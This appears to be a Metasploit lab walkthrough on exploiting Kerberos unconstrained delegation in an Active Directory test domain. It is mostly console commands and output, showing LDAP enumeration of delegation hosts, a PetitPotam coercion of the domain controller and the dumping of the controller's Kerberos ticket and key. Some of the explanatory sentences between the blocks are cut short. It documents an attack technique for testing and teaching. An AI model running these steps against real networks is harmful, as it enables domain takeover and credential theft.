# Unconstrained Delegation Exploitation
## Lab setup
## Attack Workflow
### Target Identification
Use the `ENUM_UNCONSTRAINED_DELEGATION` action to enumerate targets:
```
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(gather/ldap_query) > set DOMAIN msflab.local
DOMAIN => msflab.local
msf6 auxiliary(gather/ldap_query) > set USERNAME aliddle
USERNAME => aliddle
msf6 auxiliary(gather/ldap_query) > set PASSWORD Password1!
PASSWORD => Password1!
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_UNCONSTRAINED_DELEGATION 
ACTION => ENUM_UNCONSTRAINED_DELEGATION
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=WS01 CN=Computers DC=msflab DC=local
=======================================

 Name            Attributes
 ----            ----------
 cn              WS01
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  WS01$

CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name            Attributes
 ----            ----------
 cn              DC
 memberof        CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=msflab,DC=local || CN=Cert Publishers,CN=Users,DC=msflab,DC=local
 objectcategory  CN=Computer,CN=Schema,CN=Configuration,DC=msflab,DC=local
 samaccountname  DC$

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) > 
```

domain controllers to remove from the list of potential targets.
```
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_DOMAIN_CONTROLLERS 
ACTION => ENUM_DOMAIN_CONTROLLERS
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
[+] 192.168.159.10:389 Discovered schema DN: DC=msflab,DC=local
CN=DC OU=Domain Controllers DC=msflab DC=local
==============================================

 Name                    Attributes
 ----                    ----------
 distinguishedname       CN=DC,OU=Domain Controllers,DC=msflab,DC=local
 dnshostname             DC.msflab.local
 name                    DC
 operatingsystem         Windows Server 2019 Standard
 operatingsystemversion  10.0 (17763)

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) >
```

### Exploitation
compromised domain account.
```
msf6 > use auxiliary/scanner/dcerpc/petitpotam 
msf6 auxiliary(scanner/dcerpc/petitpotam) > set LISTENER ws01.msflab.local
LISTENER => ws01.msflab.local
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(scanner/dcerpc/petitpotam) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(scanner/dcerpc/petitpotam) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(scanner/dcerpc/petitpotam) > run

[+] 192.168.159.10:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful
[*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/dcerpc/petitpotam) >
```

computer account.
```
msf6 > use post/windows/manage/kerberos_tickets 
msf6 post(windows/manage/kerberos_tickets) > set SESSION -1
SESSION => -1
msf6 post(windows/manage/kerberos_tickets) > set SERVICE krbtgt/*
SERVICE => krbtgt/*
msf6 post(windows/manage/kerberos_tickets) > run

[*] LSA Handle: 0x000001efe1c415a0
[*] LogonSession LUID: 0x00004bc1d 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:33:17 -0400
[*]   Ticket[0]
[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823151727_default_192.168.159.10_mit.kerberos.cca_488233.bin
        Primary Principal: DC$@MSFLAB.LOCAL
        Ccache version: 4
        
        Creds: 1
          Credential[0]:
            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL
            Client: DC$@MSFLAB.LOCAL
            Ticket etype: 18 (AES256)
            Key: e515137250f072d44b7487c09b8033a34ff1c7e96ad20674007c255a0a8de2b0
            Subkey: false
            Ticket Length: 1006
            Ticket Flags: 0x60a10000 (FORWARDABLE, FORWARDED, RENEWABLE, PRE_AUTHENT, CANONICALIZE)
            Addresses: 0
            Authdatas: 0
            Times:
              Auth time: 1969-12-31 19:00:00 -0500
              Start time: 2023-08-23 08:33:17 -0400
              End time: 2023-08-23 18:33:17 -0400
              Renew Till: 2023-08-30 08:33:17 -0400
            Ticket:
              Ticket Version Number: 5
              Realm: MSFLAB.LOCAL
              Server Name: krbtgt/MSFLAB.LOCAL
              Encrypted Ticket Part:
                Ticket etype: 18 (AES256)
                Key Version Number: 2
                Cipher:
                  L/csyZle+LDn1i7Yqci0vbZCHrjO8CeQXBSix3d1lCR66sR0Zq/ogR/6g3X8yGn9acvGjAtt29ZErQe4FA3ttZ6MA2p8QldvbQCvELLpQkOHKrmzd2YhWy5YxfbwzFpZT0OtFEB0gYW3AQuOyRKk5vCuljZH6bPaz77g8KUejFx80tJbmz6n2GLOzG8rcMiy/i/zYreG6TLnjZJgw3UVABFSjUKs20eSK2Le5OxSKfcBQTwaRp+BPdXWGbMNYWwTUntAZGC5G6DE9xglY0+T2D/9HFSWVesrnduMmzHR9NojQYezHJorMKh7m5/KeNEzuJUDLCkgX/Uscq8dc6XMaFH7aIsg5+nlAZBPTrYtkayun6AaTLJpqLg90ab3iYCZpvdCBKBPapg3271YVHe8i7OaDDJWXMNooi+6Jg+B1cnBRH9qQ5T2k7RQLMNez9P8dvuMkDmFpRz5KOJk+w+Mz6XFeu9g1Z4zXQ6msI060PrwvAENevTN9DKUWtDGBCQMTjBDm75sMA7Aq8KgBqKYUhP+CV+HzgFou4P1/t3l+udRBIYfQw68EHW2dQE/ZZR+oLPPHbCsbnpkp/rSFjdsl0E9Zm4upPty3M+sKd2fdZSLXs5CLBs5WeZmPrXHrHnyC/AnoLNQVTVCtv5EpM50BWooXWKHljLctHxN/W6ZXgqwZ4R7KNYIrtaAsmLrkq2K/z+zsuAWRoDKFtLWZMD9eqfsGi2bRBqPf74+mi1bPXL/1eWlUwmrjr5Buj4kvC8XB+wTRoAkSrjoAx7IglfSIKdW/5N3CX6G+smJWZCsrGIvouTzIzcpHCXgoaHypnm2B9G7yIwkDgpCFd4MW3t8ZrZXOjuReQ6Aiy9mXHlbReX9G3Xl0fj7z4cIKSV4YiyEkjXJE+eAT7GdtJEPFXJJw6Fxhdam+FL+SKVvu4kw+uvqfz72GDG24/KqM3/0L58M96oEd1LHnVoHwuPtfDA7xhvHDu8iYZOkOjDc5cwMCU0MmW5A1cijTuNfSeRRHx6xXLPKkIJH/5XWeg7BAG3lnlOgS/HKj+Uhti7fabZHUvXyGAdA7CJzZ2OUlZY6Acm9JU2EuUfFvnpEjAtasckDA43pb/r4ZNIZPxcq6gpgcdFpZIb8H7bbWdIIinDJfFkEunJ7E1TG9wSbX6j6JfThG31L7EBW+UPHlDa4k1wPFMP3lNgleVUBi0n24T1RBTb6c5W0Cw==
[*] LogonSession LUID: 0x00001052b 
[*]   User:                  Window Manager\DWM-1
[*]   Session:               1
[*]   AuthenticationPackage: Negotiate
[*]   LogonType:             Interactive (2)
[*]   LogonTime:             2023-08-23 08:32:38 -0400

... omitted for brevity ...
```

ticket was stored to disk in a ccache file. The ticket can also be seen in the output of `klist`.
```
msf6 post(windows/manage/kerberos_tickets) > klist
Kerberos Cache
==============
id   host            principal               sname                             issued                     status  path
--   ----            ---------               -----                             ------                     ------  ----
411  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151744_default_192.168.159.10_mit.kerberos.cca_307418.bin
407  192.168.159.10  WS01$@MSFLAB.LOCAL      krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 15:14:46 -0400  active  /home/smcintyre/.msf4/loot/20230823151735_default_192.168.159.10_mit.kerberos.cca_760842.bin

msf6 post(windows/manage/kerberos_tickets) > 
```

